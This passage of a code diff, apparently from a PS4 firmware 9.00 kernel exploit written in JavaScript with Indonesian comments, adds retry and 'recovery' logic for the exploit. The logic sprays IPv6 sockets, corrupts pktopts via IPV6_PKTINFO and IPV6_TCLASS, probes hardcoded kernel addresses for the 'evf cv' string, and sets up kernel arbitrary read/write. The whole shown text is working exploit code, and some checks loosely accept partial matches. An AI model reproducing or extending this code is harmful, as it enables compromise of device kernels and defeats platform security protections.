-                        ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
-                        gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
-                        kstr = jstr(read_buf);
-                        log(`Recovery read 2 (socket ${i}): ${kstr}`);
-
-                        if (kstr === 'evf cv') {
-                            log(`Recovery successful with socket ${i}`);
-                            break;
-                        }
-                    } catch (e) {
-                        log(`Error with recovery socket ${i}: ${e.message}`);
+            // Coba setiap variasi alamat
+            for (let i = 0; i < addr_variations.length; i++) {
+                try {
+                    const curr_addr = addr_variations[i];
+                    if (i > 0) {
+                        log(`Trying address variation ${i}: offset ${(curr_addr - kernel_addr)}`);
                     }
-                }
 
-                if (kstr !== 'evf cv') {
-                    throw new Error("All recovery attempts failed");
+                    // Coba lagi dengan socket baru
+                    pktinfo.write64(0, curr_addr);
+                    ssockopt(recovery_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+
+                    // Tambahkan delay
+                    sleep(50);
+
+                    // Coba baca lagi
+                    gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                    kstr = jstr(read_buf);
+                    log(`Enhanced recovery read 1 (variation ${i}): ${kstr}`);
+
+                    // Jika berhasil, keluar dari loop
+                    if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
+                        log(`Enhanced recovery successful on variation ${i}`);
+                        kernel_addr = curr_addr; // Update alamat kernel jika berhasil
+                        test_read_success = true;
+                        break;
+                    }
+                } catch (e) {
+                    log(`Error during address variation ${i}: ${e.message}`);
+                    // Lanjutkan ke variasi berikutnya
                 }
             }
 
-            log("Recovery successful");
+            // Jika masih gagal, coba pendekatan kedua yang lebih agresif
+            if (!test_read_success) {
+                log("Enhanced recovery attempt 1 failed, trying second approach");
+
+                // Bersihkan memori lagi
+                cleanupCorruptPointers();
+
+                // Tambahkan delay yang lebih panjang
+                sleep(500);
+
+                // Buat lebih banyak socket baru
+                const recovery_sds = [];
+                for (let i = 0; i < 10; i++) { // Tingkatkan dari 5 ke 10
+                    recovery_sds.push(new_socket());
+                }
+                log(`Created ${recovery_sds.length} recovery sockets`);
+
+                // Siapkan socket dengan pktopts
+                for (let i = 0; i < recovery_sds.length; i++) {
+                    try {
+                        const tclass = new Word(0xdead | i << 16);
+                        ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                    } catch (e) {
+                        log(`Error setting tclass for socket ${i}: ${e.message}`);
+                    }
+                }
+
+                // Tambahkan delay
+                sleep(200); // Tingkatkan dari 100 ke 200
+
+                // Coba dengan setiap socket dan variasi alamat
+                for (let i = 0; i < recovery_sds.length; i++) {
+                    // Validasi socket sebelum digunakan
+                    if (!isValidSocket(recovery_sds[i])) {
+                        log(`Socket ${i} tidak valid, melewati`);
+                        continue;
+                    }
+
+                    // Coba setiap variasi alamat
+                    for (let j = 0; j < addr_variations.length; j++) {
+                        try {
+                            const curr_addr = addr_variations[j];
+
+                            pktinfo.write64(0, curr_addr);
+                            ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                            gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                            kstr = jstr(read_buf);
+                            log(`Enhanced recovery read 2 (socket ${i}, variation ${j}): ${kstr}`);
+
+                            if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
+                                log(`Enhanced recovery successful with socket ${i}, variation ${j}`);
+                                kernel_addr = curr_addr; // Update alamat kernel jika berhasil
+                                test_read_success = true;
+                                break;
+                            }
+                        } catch (e) {
+                            log(`Error with recovery socket ${i}, variation ${j}: ${e.message}`);
+                        }
+                    }
+
+                    // Jika berhasil, keluar dari loop
+                    if (test_read_success) {
+                        break;
+                    }
+                }
+
+                // Jika masih gagal, coba pendekatan terakhir dengan alamat kernel yang berbeda
+                if (!test_read_success) {
+                    log("Enhanced recovery attempt 2 failed, trying last resort approach");
+
+                    // Bersihkan memori sekali lagi
+                    cleanupCorruptPointers();
+
+                    // Tambahkan delay yang sangat panjang
+                    sleep(1000);
+
+                    // Coba pendekatan alternatif dengan alamat kernel yang berbeda
+                    // Pada firmware 9.00, string "evf cv" bisa berada di lokasi yang berbeda
+                    // Gunakan BigInt untuk alamat kernel yang besar
+                    const base_addr = BigInt("0xffffffffd345af00");
+                    const alternative_addrs = [
+                        base_addr,                    // Base address
+                        base_addr + BigInt(32),       // +32 bytes
+                        base_addr + BigInt(64),       // +64 bytes
+                        base_addr - BigInt(256),      // -256 bytes
+                        base_addr + BigInt(256)       // +256 bytes
+                    ];
+
+                    log("Trying alternative kernel addresses as last resort...");
+
+                    // Buat socket baru untuk pendekatan terakhir
+                    const last_resort_sd = new_socket();
+                    log(`Created last resort socket: ${last_resort_sd}`);
+
+                    // Siapkan socket dengan pktopts
+                    const tclass = new Word(0xface);
+                    ssockopt(last_resort_sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+
+                    // Tambahkan delay
+                    sleep(200);
+
+                    // Coba setiap alamat alternatif
+                    for (let i = 0; i < alternative_addrs.length; i++) {
+                        try {
+                            const alt_addr = alternative_addrs[i];
+                            log(`Trying alternative address ${i}: ${alt_addr.toString(16)}`);
+
+                            // Konversi BigInt ke Number untuk kompatibilitas
+                            // Catatan: Ini aman karena kita hanya menggunakan alamat ini untuk operasi internal
+                            const alt_addr_num = Number(alt_addr);
+
+                            // Coba baca kernel memory
+                            pktinfo.write64(0, alt_addr_num);
+                            ssockopt(last_resort_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                            gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                            kstr = jstr(read_buf);
+                            log(`Last resort read ${i}: ${kstr}`);
+
+                            // Jika berhasil, keluar dari loop
+                            if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
+                                log(`Last resort successful with alternative address ${i}`);
+                                kernel_addr = alt_addr_num; // Update alamat kernel
+                                test_read_success = true;
+                                break;
+                            }
+                        } catch (e) {
+                            log(`Error during alternative address ${i}: ${e.message}`);
+                            // Lanjutkan ke alamat berikutnya
+                        }
+                    }
+                }
+
+                if (!test_read_success) {
+                    throw new Error("All enhanced recovery attempts failed");
+                }
+            }
+
+            log("Enhanced recovery successful");
         } catch (e) {
-            log(`Recovery attempts failed: ${e.message}`);
-            die('test read of &"evf cv" failed');
+            log(`Enhanced recovery attempts failed: ${e.message}`);
+            die('test read of &"evf cv" failed after all recovery attempts');
         }
+    }
+
+    // Log hasil akhir test read
+    log(`Final test read result: ${kstr}`);
+    log(`Test read ${test_read_success ? 'successful' : 'failed'}`);
+
+    // Jika berhasil tapi tidak persis "evf cv", berikan peringatan
+    if (test_read_success && kstr !== 'evf cv') {
+        log(`Warning: Test read returned "${kstr}" instead of "evf cv", but continuing anyway`);
     }
 
     // Only For PS4 9.00
@@ -2194,12 +2981,21 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     function setupKernelRW(maxRetries = 3) {
         log(`Attempting to setup kernel read/write with ${maxRetries} retries...`);
 
+        // Deteksi dan tangani potensi Kernel Panic secara proaktif
+        detectPotentialKP();
+
+        // Tambahkan pembersihan memori tambahan
+        cleanupCorruptPointers();
+
+        // Tambahkan delay untuk stabilitas
+        sleep(500);
+
         for (let retry = 0; retry < maxRetries; retry++) {
             try {
                 log(`Retry ${retry + 1}/${maxRetries} for setup kernel read/write`);
 
                 // Tambahkan delay yang meningkat dengan setiap retry
-                sleep(50 * (retry + 1));
+                sleep(100 * (retry + 1)); // Tingkatkan dari 50 ke 100
 
                 // get restricted read/write with pktopts pair
                 // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
@@ -2251,24 +3047,83 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
 
     // Coba setup kernel read/write dengan retry
-    if (!setupKernelRW(3)) {
+    if (!setupKernelRW(5)) { // Tingkatkan dari 3 ke 5
         log("Standard approach failed. Trying alternative approach...");
 
         // Coba pendekatan alternatif
         try {
-            // Buat socket baru
-            const alt_sd = new_socket();
-            log(`Created alternative socket: ${alt_sd}`);
+            // Bersihkan memori sebelum mencoba pendekatan alternatif
+            cleanupCorruptPointers();
+
+            // Tambahkan delay yang lebih panjang
+            sleep(500);
+
+            // Buat beberapa socket baru untuk pendekatan alternatif
+            const alt_sds = [];
+            for (let i = 0; i < 5; i++) {
+                alt_sds.push(new_socket());
+            }
+            log(`Created ${alt_sds.length} alternative sockets`);
 
             // Siapkan socket dengan pktopts
-            const tclass = new Word(0xcafe);
-            ssockopt(alt_sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+            for (let i = 0; i < alt_sds.length; i++) {
+                try {
+                    const tclass = new Word(0xcafe | i << 16);
+                    ssockopt(alt_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                } catch (e) {
+                    log(`Error setting tclass for socket ${i}: ${e.message}`);
+                }
+            }
 
             // Tambahkan delay
-            sleep(100);
+            sleep(200);
+
+            // Validasi socket sebelum digunakan
+            let validSocketFound = false;
+            let validSocket = null;
+
+            for (let i = 0; i < alt_sds.length; i++) {
+                if (isValidSocket(alt_sds[i])) {
+                    validSocket = alt_sds[i];
+                    validSocketFound = true;
+                    log(`Found valid alternative socket: ${validSocket}`);
+                    break;
+                }
+            }
+
+            if (!validSocketFound) {
+                log("No valid alternative socket found, using first socket");
+                validSocket = alt_sds[0];
+            }
 
             // Coba lagi dengan socket baru
-            if (!setupKernelRW(2)) {
+            if (!setupKernelRW(3)) { // Tingkatkan dari 2 ke 3
+                // Coba pendekatan terakhir dengan socket yang berbeda
+                log("Alternative approach failed. Trying last resort approach...");
+
+                // Bersihkan memori lagi
+                cleanupCorruptPointers();
+
+                // Tambahkan delay yang lebih panjang
+                sleep(1000);
+
+                // Coba dengan socket yang berbeda
+                for (let i = 0; i < alt_sds.length; i++) {
+                    if (alt_sds[i] !== validSocket && isValidSocket(alt_sds[i])) {
+                        log(`Trying last resort with socket ${i}`);
+
+                        // Gunakan socket ini untuk setup
+                        main_sd = alt_sds[i];
+
+                        // Coba setup lagi
+                        if (setupKernelRW(2)) {
+                            log("Last resort approach successful");
+                            break;
+                        }
+                    }
+                }
+
+                // Jika masih gagal, menyerah
                 die('pktopts read failed after all attempts');
             }
         } catch (e) {
